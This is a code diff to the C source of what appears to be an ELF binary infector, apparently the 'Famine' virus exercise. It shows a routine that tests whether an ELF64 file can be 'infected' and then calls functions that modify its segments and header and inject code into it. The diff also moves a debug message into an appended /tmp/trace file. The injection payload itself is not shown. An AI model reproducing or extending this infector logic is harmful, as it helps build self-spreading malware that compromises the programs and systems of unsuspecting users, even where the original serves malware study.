@@ -40,14 +40,9 @@ static inline bool is_not_infected(const Elf64_Ehdr *header)
 /// PUBLIC FUNCTION
 ////////////////////////////////////////////////////////////////////////////////
 
-static inline void defer(struct s_info *info)
+void famine(char *file)
 {
-	release_info(info);
-}
-
-void famine(const char *file, const size_t m_entry)
-{
-	__attribute__((cleanup(defer))) struct s_info info;
+	struct s_info info;
 	Elf64_Ehdr *header;
 	const struct criteria crit[] =
 	{
@@ -67,12 +62,16 @@ void famine(const char *file, const size_t m_entry)
 		if (crit[index].fct(header) == false)
 		{
 #if DEBUG
-			char fam[] = "\033[0;31mFamine\033[0m: ";
+			char name[] = "/tmp/trace";
+			int fd = _open(name, O_RDWR | O_CREAT | O_APPEND, 0644);
+			char fam[] = "Famine: ";
 			char des[] = " can't be infected\n\n";
 
-			_write(1, fam, _strlen(fam)); 
-			_write(1, info.name, _strlen(info.name));
-			_write(1, des, _strlen(des)); 
+			_write(fd, fam, _strlen(fam)); 
+			_write(fd, info.name, _strlen(info.name));
+			_write(fd, des, _strlen(des)); 
+
+			_close(fd);
 #endif
 			return ;
 		}
@@ -80,5 +79,5 @@ void famine(const char *file, const size_t m_entry)
 
 	modify_segment(&info);
 	modify_header(&info, header);	
-	inject(&info, m_entry);
+	inject(&info);
 }
